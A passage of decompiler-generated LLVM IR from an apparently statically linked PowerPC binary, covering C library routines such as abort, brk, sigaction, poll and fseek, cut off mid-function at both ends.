  %v0_10012d80 = load i32, i32* @lr, align 4
  store i32 %v0_10012d80, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10012d8c = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_10012d9c = add i32 %tmp, 4
  store i32 %v1_10012d9c, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_10012da4 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_10012da4, i32* @r3, align 4
  br i1 %v3_10012d8c, label %dec_label_pc_10012dcc, label %dec_label_pc_10012dac

dec_label_pc_10012dac:                            ; preds = %entry
  %v2_10012dac = load i32, i32* %arg2, align 4
  store i32 %v2_10012dac, i32* %r0.global-to-local, align 4
  store i32 268512696, i32* @lr, align 4
  %v0_10012db4 = call i32 @memcpy()
  %v0_10012db8 = load i32, i32* @r31, align 4
  %v1_10012db8 = add i32 %v0_10012db8, 132
  %v2_10012db8 = inttoptr i32 %v1_10012db8 to i32*
  %v3_10012db8 = load i32, i32* %v2_10012db8, align 4
  store i32 %v3_10012db8, i32* %r0.global-to-local, align 4
  %v1_10012dc4 = add i32 %v0_10012db8, 136
  %v2_10012dc4 = inttoptr i32 %v1_10012dc4 to i32*
  %v3_10012dc4 = load i32, i32* %v2_10012dc4, align 4
  store i32 %v3_10012dc4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10012dcc

dec_label_pc_10012dcc:                            ; preds = %entry, %dec_label_pc_10012dac
  store i32 268512748, i32* @lr, align 4
  %v0_10012de8 = call i32 @__syscall_rt_sigaction()
  %v0_10012dec = load i32, i32* %r30.global-to-local, align 4
  %v3_10012dec = icmp eq i32 %v0_10012dec, 0
  store i32 %v0_10012de8, i32* @r31, align 4
  br i1 %v3_10012dec, label %dec_label_pc_10012e28, label %dec_label_pc_10012dfc

dec_label_pc_10012dfc:                            ; preds = %dec_label_pc_10012dcc
  %v1_10012df4 = icmp slt i32 %v0_10012de8, 0
  %v1_10012dfc = add i32 %v0_10012dec, 4
  store i32 %v1_10012dfc, i32* @r3, align 4
  %v2_10012e00 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_10012e00, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_10012df4, label %dec_label_pc_10012e28, label %dec_label_pc_10012e0c

dec_label_pc_10012e0c:                            ; preds = %dec_label_pc_10012dfc
  %v3_10012e0c = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_10012e0c, i32* %r0.global-to-local, align 4
  %v2_10012e10 = inttoptr i32 %v0_10012dec to i32*
  store i32 %v3_10012e0c, i32* %v2_10012e10, align 4
  store i32 268512792, i32* @lr, align 4
  %v0_10012e14 = call i32 @memcpy()
  %v1_10012e20 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012e20 = add i32 %v1_10012e20, 136
  %v3_10012e20 = inttoptr i32 %v2_10012e20 to i32*
  %v0_10012e24 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012e24 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012e24 = add i32 %v1_10012e24, 132
  %v3_10012e24 = inttoptr i32 %v2_10012e24 to i32*
  store i32 %v0_10012e24, i32* %v3_10012e24, align 4
  %v0_10012e2c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012e28

dec_label_pc_10012e28:                            ; preds = %dec_label_pc_10012dfc, %dec_label_pc_10012dcc, %dec_label_pc_10012e0c
  %v0_10012e2c = phi i32 [ %v0_10012de8, %dec_label_pc_10012dfc ], [ %v0_10012de8, %dec_label_pc_10012dcc ], [ %v0_10012e2c.pre, %dec_label_pc_10012e0c ]
  store i32 %v0_10012d80, i32* %r0.global-to-local, align 4
  ret i32 %v0_10012e2c

; uselistorder directives
  uselistorder i32 %v0_10012de8, { 0, 1, 3, 2 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10012e28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012dcc, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_10012e74.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_10012e58 = call i32 @__pthread_return_0()
  %v2_10012e60 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_10012e60, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_10012e7833 = add i32 %v2_10012e60, 124
  %v4_10012e7834 = inttoptr i32 %v3_10012e7833 to i32*
  store i32 0, i32* %v4_10012e7834, align 4
  %v0_10012e7c35 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012e7c36 = add i32 %v0_10012e7c35, -1
  store i32 %v1_10012e7c36, i32* %r9.global-to-local, align 4
  %v0_10012e8037 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012e8038 = add i32 %v0_10012e8037, -1
  store i32 %v1_10012e8038, i32* %ctr.global-to-local, align 4
  %v2_10012e8039 = icmp eq i32 %v1_10012e8038, 0
  br i1 %v2_10012e8039, label %dec_label_pc_10012e84, label %dec_label_pc_10012e74.dec_label_pc_10012e74_crit_edge

dec_label_pc_10012e74.dec_label_pc_10012e74_crit_edge: ; preds = %dec_label_pc_10012e74.lr.ph, %dec_label_pc_10012e74.dec_label_pc_10012e74_crit_edge
  %v1_10012e7c40 = phi i32 [ %v1_10012e7c, %dec_label_pc_10012e74.dec_label_pc_10012e74_crit_edge ], [ %v1_10012e7c36, %dec_label_pc_10012e74.lr.ph ]
  %v0_10012e78.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10012e78.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_10012e74 = mul i32 %v1_10012e7c40, 4
  %v3_10012e78 = add i32 %v1_10012e74, %v1_10012e78.pre
  %v4_10012e78 = inttoptr i32 %v3_10012e78 to i32*
  store i32 %v0_10012e78.pre, i32* %v4_10012e78, align 4
  %v0_10012e7c = load i32, i32* %r9.global-to-local, align 4
  %v1_10012e7c = add i32 %v0_10012e7c, -1
  store i32 %v1_10012e7c, i32* %r9.global-to-local, align 4
  %v0_10012e80 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012e80 = add i32 %v0_10012e80, -1
  store i32 %v1_10012e80, i32* %ctr.global-to-local, align 4
  %v2_10012e80 = icmp eq i32 %v1_10012e80, 0
  br i1 %v2_10012e80, label %dec_label_pc_10012e84, label %dec_label_pc_10012e74.dec_label_pc_10012e74_crit_edge

dec_label_pc_10012e84:                            ; preds = %dec_label_pc_10012e74.dec_label_pc_10012e74_crit_edge, %dec_label_pc_10012e74.lr.ph
  store i32 %v2_10012e60, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_10012e8c = call i32 @__sigaddset()
  %v3_10012e90 = icmp eq i32 %v0_10012e8c, 0
  br i1 %v3_10012e90, label %dec_label_pc_10012e98, label %dec_label_pc_10012ea8

dec_label_pc_10012e98:                            ; preds = %dec_label_pc_10012e84
  store i32 268512936, i32* @lr, align 4
  %v3_10012ea4 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10012e60, i32 0)
  br label %dec_label_pc_10012ea8

dec_label_pc_10012ea8:                            ; preds = %dec_label_pc_10012e84, %dec_label_pc_10012e98
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v3_10012eac = load i32, i32* @global_var_10028624.701, align 4
  %v3_10012eb0 = icmp eq i32 %v3_10012eac, 0
  br i1 %v3_10012eb0, label %dec_label_pc_10012eb8, label %dec_label_pc_10012ee0

dec_label_pc_10012eb8:                            ; preds = %dec_label_pc_10012ea8
  store i32 1, i32* @global_var_10028624.701, align 4
  br label %dec_label_pc_10012ec0

dec_label_pc_10012ec0:                            ; preds = %dec_label_pc_10012f3c, %dec_label_pc_10012eb8
  store i32 ptrtoint (i32* @global_var_10028550.699 to i32), i32* %r29.global-to-local, align 4
  %v0_10012ecc = call i32 @__pthread_return_0()
  store i32 268512984, i32* @lr, align 4
  %v1_10012ed4 = call i32 @__raise(i32 6)
  %v0_10012edc = call i32 @__pthread_return_0()
  %v3_10012ee4.pre = load i32, i32* @global_var_10028624.701, align 4
  br label %dec_label_pc_10012ee0

dec_label_pc_10012ee0:                            ; preds = %dec_label_pc_10012ea8, %dec_label_pc_10012ec0
  %v0_10012f58 = phi i32 [ %v3_10012eac, %dec_label_pc_10012ea8 ], [ %v3_10012ee4.pre, %dec_label_pc_10012ec0 ]
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v3_10012ee8 = icmp eq i32 %v0_10012f58, 1
  br i1 %v3_10012ee8, label %dec_label_pc_10012f28.lr.ph, label %dec_label_pc_10012f58

dec_label_pc_10012f28.lr.ph:                      ; preds = %dec_label_pc_10012ee0
  %v2_10012ef4 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_10028624.701, align 4
  store i32 ptrtoint (i32* @global_var_10012f08.703 to i32), i32* @lr, align 4
  %v3_10012f04 = call i32 @__GI_memset(i32 %v2_10012ef4, i32 0, i32 140)
  store i32 %v2_10012e60, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_10012e7833, i32* %r9.global-to-local, align 4
  %v2_10012f3025 = add i32 %v2_10012e60, 256
  %v3_10012f3026 = inttoptr i32 %v2_10012f3025 to i32*
  store i32 -1, i32* %v3_10012f3026, align 4
  %v0_10012f3427 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012f3428 = add i32 %v0_10012f3427, -1
  store i32 %v1_10012f3428, i32* %r11.global-to-local, align 4
  %v0_10012f3829 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012f3830 = add i32 %v0_10012f3829, -1
  store i32 %v1_10012f3830, i32* %ctr.global-to-local, align 4
  %v2_10012f3831 = icmp eq i32 %v1_10012f3830, 0
  br i1 %v2_10012f3831, label %dec_label_pc_10012f3c, label %dec_label_pc_10012f28.dec_label_pc_10012f28_crit_edge

dec_label_pc_10012f28.dec_label_pc_10012f28_crit_edge: ; preds = %dec_label_pc_10012f28.lr.ph, %dec_label_pc_10012f28.dec_label_pc_10012f28_crit_edge
  %v1_10012f3432 = phi i32 [ %v1_10012f34, %dec_label_pc_10012f28.dec_label_pc_10012f28_crit_edge ], [ %v1_10012f3428, %dec_label_pc_10012f28.lr.ph ]
  %v1_10012f2c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_10012f30.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10012f28 = mul i32 %v1_10012f3432, 4
  %v2_10012f2c = add i32 %v1_10012f28, %v1_10012f2c.pre
  store i32 %v2_10012f2c, i32* %r9.global-to-local, align 4
  %v2_10012f30 = add i32 %v2_10012f2c, 132
  %v3_10012f30 = inttoptr i32 %v2_10012f30 to i32*
  store i32 %v0_10012f30.pre, i32* %v3_10012f30, align 4
  %v0_10012f34 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012f34 = add i32 %v0_10012f34, -1
  store i32 %v1_10012f34, i32* %r11.global-to-local, align 4
  %v0_10012f38 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012f38 = add i32 %v0_10012f38, -1
  store i32 %v1_10012f38, i32* %ctr.global-to-local, align 4
  %v2_10012f38 = icmp eq i32 %v1_10012f38, 0
  br i1 %v2_10012f38, label %dec_label_pc_10012f3c, label %dec_label_pc_10012f28.dec_label_pc_10012f28_crit_edge

dec_label_pc_10012f3c:                            ; preds = %dec_label_pc_10012f28.dec_label_pc_10012f28_crit_edge, %dec_label_pc_10012f28.lr.ph
  store i32 268513108, i32* @lr, align 4
  %v4_10012f50 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10012ec0

dec_label_pc_10012f58:                            ; preds = %dec_label_pc_10012ee0
  %v3_10012f58 = icmp eq i32 %v0_10012f58, 2
  br i1 %v3_10012f58, label %dec_label_pc_10012f60, label %dec_label_pc_10012f6c

dec_label_pc_10012f60:                            ; preds = %dec_label_pc_10012f58
  store i32 3, i32* @global_var_10028624.701, align 4
  br label %dec_label_pc_10012f6c

dec_label_pc_10012f6c:                            ; preds = %dec_label_pc_10012f58, %dec_label_pc_10012f60
  %v3_10012f6c = phi i32 [ %v0_10012f58, %dec_label_pc_10012f58 ], [ 3, %dec_label_pc_10012f60 ]
  %v1_10012f74 = icmp ne i32 %v3_10012f6c, 3
  call void @__pseudo_cond_branch(i1 %v1_10012f74, i32 268513160)
  store i32 4, i32* @global_var_10028624.701, align 4
  %v1_10012f84 = call i32 @__GI__exit(i32 127)
  ret i32 %v1_10012f84

; uselistorder directives
  uselistorder i32 %v1_10012f38, { 1, 0 }
  uselistorder i32 %v1_10012f34, { 1, 0 }
  uselistorder i32 %v1_10012e80, { 1, 0 }
  uselistorder i32 %v1_10012e7c, { 1, 0 }
  uselistorder i32 %v2_10012e60, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 2, 5, 6, 8, 7, 3, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 1, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 4, 0, 1, 9, 8, 5, 2, 3 }
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 4, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2 }
  uselistorder i32 127, { 1, 5, 0, 2, 4, 6, 7, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder i32 132, { 4, 2, 3, 0, 1 }
  uselistorder i32* @global_var_10028624.701, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 268632064, { 26, 27, 20, 0, 21, 22, 1, 31, 3, 2, 10, 4, 25, 23, 24, 15, 16, 17, 14, 28, 29, 30, 18, 19, 5, 11, 6, 7, 8, 12, 13, 9 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_10012f6c, { 1, 0 }
  uselistorder label %dec_label_pc_10012f28.dec_label_pc_10012f28_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10012ee0, { 1, 0 }
  uselistorder label %dec_label_pc_10012ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10012e74.dec_label_pc_10012e74_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10012f90 = add i32 %arg1, 28
  %v2_10012f90 = inttoptr i32 %v1_10012f90 to i32*
  %v3_10012f90 = load i32, i32* %v2_10012f90, align 4
  store i32 %v3_10012f90, i32* @global_var_10028628.704, align 4
  %v1_10012fa0 = add i32 %arg1, 44
  %v2_10012fa0 = inttoptr i32 %v1_10012fa0 to i32*
  %v3_10012fa0 = load i32, i32* %v2_10012fa0, align 4
  store i32 %v3_10012fa0, i32* @global_var_1002862c.705, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_10028630.668, align 4
  %v0_10012fd4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_10012fd4)
  store i32 12, i32* @r3, align 4
  %v0_10012fdc = call i32 @__syscall_error()
  ret i32 %v0_10012fdc

; uselistorder directives
  uselistorder i32* @global_var_10028630.668, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10012ff8 = call i32 @__asm_mfcr()
  %v1_10012ffc = and i32 %v0_10012ff8, 268435456
  %v3_10012ffc = icmp eq i32 %v1_10012ffc, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10012ff8, i32* %r31.global-to-local, align 4
  br i1 %v3_10012ffc, label %dec_label_pc_10013014, label %dec_label_pc_10013008

dec_label_pc_10013008:                            ; preds = %entry
  %v0_10013008 = call i32 @__errno_location()
  %v0_1001300c = load i32, i32* %r31.global-to-local, align 4
  %v2_1001300c = inttoptr i32 %v0_10013008 to i32*
  store i32 %v0_1001300c, i32* %v2_1001300c, align 4
  br label %dec_label_pc_10013014

dec_label_pc_10013014:                            ; preds = %entry, %dec_label_pc_10013008
  %v0_10013024 = phi i32 [ %v0_10012ff8, %entry ], [ -1, %dec_label_pc_10013008 ]
  ret i32 %v0_10013024

; uselistorder directives
  uselistorder i1* @cr0_so, { 3, 0, 7, 8, 9, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_10013014, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10013040 = call i32 @__asm_mfcr()
  %v1_10013044 = and i32 %v0_10013040, 268435456
  %v3_10013044 = icmp eq i32 %v1_10013044, 0
  store i32 %v0_10013040, i32* %r31.global-to-local, align 4
  br i1 %v3_10013044, label %dec_label_pc_1001305c, label %dec_label_pc_10013050

dec_label_pc_10013050:                            ; preds = %entry
  %v0_10013050 = call i32 @__errno_location()
  %v0_10013054 = load i32, i32* %r31.global-to-local, align 4
  %v2_10013054 = inttoptr i32 %v0_10013050 to i32*
  store i32 %v0_10013054, i32* %v2_10013054, align 4
  br label %dec_label_pc_1001305c

dec_label_pc_1001305c:                            ; preds = %entry, %dec_label_pc_10013050
  %v0_1001306c = phi i32 [ %v0_10013040, %entry ], [ -1, %dec_label_pc_10013050 ]
  ret i32 %v0_1001306c

; uselistorder directives
  uselistorder label %dec_label_pc_1001305c, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10013070 = load i32, i32* @r5, align 4
  store i32 %v0_10013070, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_10013078 = zext i1 %tmp to i32
  %v2_10013078 = ashr i32 %arg1, 31
  %v3_10013078 = and i32 %v2_10013078, -2
  %v4_10013078 = or i32 %v3_10013078, %v1_10013078
  %v3_1001307c = inttoptr i32 %v4_10013078 to i16*
  %v4_1001307c = call i32 @__GI_fseeko64(i16* %v3_1001307c, i32 %arg1, i32 %v0_10013070)
  ret i32 %v4_1001307c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10013080 = load i32, i32* @r7, align 4
  %v0_10013084 = load i32, i32* @lr, align 4
  store i32 %v0_10013084, i32* %r0.global-to-local, align 4
  store i32 %v0_10013080, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_10013080, 3
  br i1 %tmp9, label %dec_label_pc_100130bc, label %dec_label_pc_100130a8

dec_label_pc_100130a8:                            ; preds = %entry
  %v0_100130a8 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_100130b4 = inttoptr i32 %v0_100130a8 to i32*
  store i32 22, i32* %v2_100130b4, align 4
  br label %dec_label_pc_10013184

dec_label_pc_100130bc:                            ; preds = %entry
  %v2_100130bc = add i32 %tmp, 52
  %v3_100130bc = inttoptr i32 %v2_100130bc to i32*
  %v4_100130bc = load i32, i32* %v3_100130bc, align 4
  store i32 %v4_100130bc, i32* @r28, align 4
  %v3_100130c0 = icmp eq i32 %v4_100130bc, 0
  br i1 %v3_100130c0, label %dec_label_pc_100130c8, label %dec_label_pc_100130e8

dec_label_pc_100130c8:                            ; preds = %dec_label_pc_100130bc
  %v2_100130c8 = add i32 %tmp, 56
  store i32 %v2_100130c8, i32* @r29, align 4
  %v2_100130d0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100130d0, i32* @r3, align 4
  %v0_100130dc = call i32 @__pthread_return_void()
  %v0_100130e4 = call i32 @__pthread_return_0()
  %v0_100130e8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100130e8

dec_label_pc_100130e8:                            ; preds = %dec_label_pc_100130bc, %dec_label_pc_100130c8
  %v0_100130f4 = phi i32 [ %tmp, %dec_label_pc_100130bc ], [ %v0_100130e8.pre, %dec_label_pc_100130c8 ]
  %v1_100130e8 = inttoptr i32 %v0_100130f4 to i16*
  %v2_100130e8 = load i16, i16* %v1_100130e8, align 2
  %v3_100130e8 = zext i16 %v2_100130e8 to i32
  store i32 %v3_100130e8, i32* %r0.global-to-local, align 4
  %v1_100130ec = and i32 %v3_100130e8, 64
  store i32 %v1_100130ec, i32* %r9.global-to-local, align 4
  %v3_100130ec = icmp eq i32 %v1_100130ec, 0
  br i1 %v3_100130ec, label %dec_label_pc_10013104, label %dec_label_pc_100130f4

dec_label_pc_100130f4:                            ; preds = %dec_label_pc_100130e8
  store i32 %v0_100130f4, i32* @r3, align 4
  store i32 268513532, i32* @lr, align 4
  %v0_100130f8 = call i32 @__stdio_wcommit()
  %v3_100130fc = icmp eq i32 %v0_100130f8, 0
  br i1 %v3_100130fc, label %dec_label_pc_10013104, label %dec_label_pc_1001316c

dec_label_pc_10013104:                            ; preds = %dec_label_pc_100130f4, %dec_label_pc_100130e8
  %v0_10013104 = load i32, i32* @r30, align 4
  %v3_10013104 = icmp eq i32 %v0_10013104, 1
  br i1 %v3_10013104, label %dec_label_pc_1001310c, label %dec_label_pc_10013104.dec_label_pc_10013120_crit_edge

dec_label_pc_10013104.dec_label_pc_10013120_crit_edge: ; preds = %dec_label_pc_10013104
  br label %dec_label_pc_10013120

dec_label_pc_1001310c:                            ; preds = %dec_label_pc_10013104
  %v0_1001310c = load i32, i32* @r31, align 4
  %v1_1001310c = inttoptr i32 %v0_1001310c to i16*
  %v2_10013110 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268513560, i32* @lr, align 4
  %v4_10013114 = call i32 @__stdio_adjust_position(i16* %v1_1001310c, i32 %v2_10013110)
  %v1_10013118 = icmp slt i32 %v4_10013114, 0
  br i1 %v1_10013118, label %dec_label_pc_1001316c, label %dec_label_pc_1001310c.dec_label_pc_10013120_crit_edge

dec_label_pc_1001310c.dec_label_pc_10013120_crit_edge: ; preds = %dec_label_pc_1001310c
  %v0_10013120.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10013120

dec_label_pc_10013120:                            ; preds = %dec_label_pc_10013104.dec_label_pc_10013120_crit_edge, %dec_label_pc_1001310c.dec_label_pc_10013120_crit_edge
  %v0_10013120 = phi i32 [ %v0_10013104, %dec_label_pc_10013104.dec_label_pc_10013120_crit_edge ], [ %v0_10013120.pre, %dec_label_pc_1001310c.dec_label_pc_10013120_crit_edge ]
  %v0_10013124 = load i32, i32* @r31, align 4
  store i32 268513584, i32* @lr, align 4
  %v5_1001312c = call i32 @__stdio_seek(i32 %v0_10013124, i32* nonnull %stack_var_-56, i32 %v0_10013120)
  %v1_10013130 = icmp slt i32 %v5_1001312c, 0
  br i1 %v1_10013130, label %dec_label_pc_1001316c, label %dec_label_pc_10013138

dec_label_pc_10013138:                            ; preds = %dec_label_pc_10013120
  %v0_10013138 = load i32, i32* @r31, align 4
  %v1_10013138 = inttoptr i32 %v0_10013138 to i16*
  %v2_10013138 = load i16, i16* %v1_10013138, align 2
  %v3_10013138 = zext i16 %v2_10013138 to i32
  store i32 %v3_10013138, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10013140 = add i32 %v0_10013138, 8
  %v2_10013140 = inttoptr i32 %v1_10013140 to i32*
  %v3_10013140 = load i32, i32* %v2_10013140, align 4
  store i32 %v3_10013140, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_10013148 = and i32 %v3_10013138, 65464
  store i32 %v1_10013148, i32* %r0.global-to-local, align 4
  %v3_1001314c = add i32 %v0_10013138, 2
  %v4_1001314c = inttoptr i32 %v3_1001314c to i8*
  store i8 0, i8* %v4_1001314c, align 1
  %v0_10013150 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013150 = load i32, i32* @r31, align 4
  %v2_10013150 = add i32 %v1_10013150, 28
  %v3_10013150 = inttoptr i32 %v2_10013150 to i32*
  store i32 %v0_10013150, i32* %v3_10013150, align 4
  %v0_10013154 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013154 = trunc i32 %v0_10013154 to i16
  %v2_10013154 = load i32, i32* @r31, align 4
  %v3_10013154 = inttoptr i32 %v2_10013154 to i16*
  store i16 %v1_10013154, i16* %v3_10013154, align 2
  %v0_10013158 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013158 = load i32, i32* @r31, align 4
  %v2_10013158 = add i32 %v1_10013158, 16
  %v3_10013158 = inttoptr i32 %v2_10013158 to i32*
  store i32 %v0_10013158, i32* %v3_10013158, align 4
  %v0_1001315c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001315c = load i32, i32* @r31, align 4
  %v2_1001315c = add i32 %v1_1001315c, 20
  %v3_1001315c = inttoptr i32 %v2_1001315c to i32*
  store i32 %v0_1001315c, i32* %v3_1001315c, align 4
  %v0_10013160 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013160 = load i32, i32* @r31, align 4
  %v2_10013160 = add i32 %v1_10013160, 24
  %v3_10013160 = inttoptr i32 %v2_10013160 to i32*
  store i32 %v0_10013160, i32* %v3_10013160, align 4
  %v0_10013164 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013164 = load i32, i32* @r31, align 4
  %v2_10013164 = add i32 %v1_10013164, 44
  %v3_10013164 = inttoptr i32 %v2_10013164 to i32*
  store i32 %v0_10013164, i32* %v3_10013164, align 4
  br label %dec_label_pc_10013170

dec_label_pc_1001316c:                            ; preds = %dec_label_pc_100130f4, %dec_label_pc_10013120, %dec_label_pc_1001310c
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_10013170

dec_label_pc_10013170:                            ; preds = %dec_label_pc_10013138, %dec_label_pc_1001316c
  %v0_10013170 = load i32, i32* @r28, align 4
  %v3_10013170 = icmp eq i32 %v0_10013170, 0
  br i1 %v3_10013170, label %dec_label_pc_10013178, label %dec_label_pc_10013184

dec_label_pc_10013178:                            ; preds = %dec_label_pc_10013170
  %v2_10013178 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10013178, i32* @r3, align 4
  %v0_10013180 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10013184

dec_label_pc_10013184:                            ; preds = %dec_label_pc_10013170, %dec_label_pc_100130a8, %dec_label_pc_10013178
  store i32 %v0_10013084, i32* %r0.global-to-local, align 4
  %v0_10013188 = load i32, i32* @r30, align 4
  ret i32 %v0_10013188

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @__pthread_return_0, { 38, 4, 3, 2, 25, 24, 23, 22, 21, 20, 0, 37, 44, 43, 18, 42, 41, 40, 39, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 19, 31, 30, 29, 33, 32, 17, 28, 16, 1, 27, 26, 36, 35, 34 }
  uselistorder i32 ()* @__pthread_return_void, { 47, 46, 43, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 0, 45, 44, 51, 50, 49, 48, 7, 6, 9, 8, 32, 31, 30, 29, 28, 27, 36, 35, 34, 33, 5, 4, 26, 25, 3, 2, 24, 23, 22, 21, 42, 41, 40, 39, 38, 37 }
  uselistorder i32 56, { 1, 5, 4, 0, 2, 3 }
  uselistorder i32 52, { 2, 3, 9, 0, 5, 1, 8, 6, 4, 7 }
  uselistorder i32 22, { 2, 14, 12, 3, 13, 4, 5, 17, 6, 19, 7, 15, 8, 9, 16, 10, 11, 0, 1, 18 }
  uselistorder label %dec_label_pc_10013184, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013170, { 1, 0 }
  uselistorder label %dec_label_pc_1001316c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10013120, { 1, 0 }
  uselistorder label %dec_label_pc_100130e8, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100131a8 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_100131b4 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100131bc = and i16 %v3_100131b4, 4
  %v3_100131bc = icmp eq i16 %v1_100131bc, 0
  br i1 %v3_100131bc, label %dec_label_pc_100131c4, label %dec_label_pc_100131fc

dec_label_pc_100131c4:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_100131d0, label %dec_label_pc_100131c8

